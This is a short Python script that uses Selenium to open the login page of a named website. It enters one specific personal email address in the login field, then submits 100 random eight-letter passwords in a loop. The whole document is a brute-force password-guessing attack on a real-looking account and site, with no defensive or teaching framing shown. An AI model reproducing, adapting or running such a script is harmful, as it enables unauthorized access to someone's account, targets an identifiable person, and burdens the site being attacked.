import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("https://www.carnesdab.cl/web/login")
letters = string.ascii_lowercase
for x in range(100):
    usr = driver.find_element_by_id("login")
    usr.clear()
    usr.send_keys("sebastian.gallardo1@mail.udp.cl")
    psw = driver.find_element_by_id("password")
    psw.clear()
    str = ''.join(random.choice(letters) for i in range(8))
    psw.send_keys(str)
    time.sleep(4)
    clk = driver.find_element_by_xpath('//*[@id="wrapwrap"]/main/div/form/div[3]/button').click()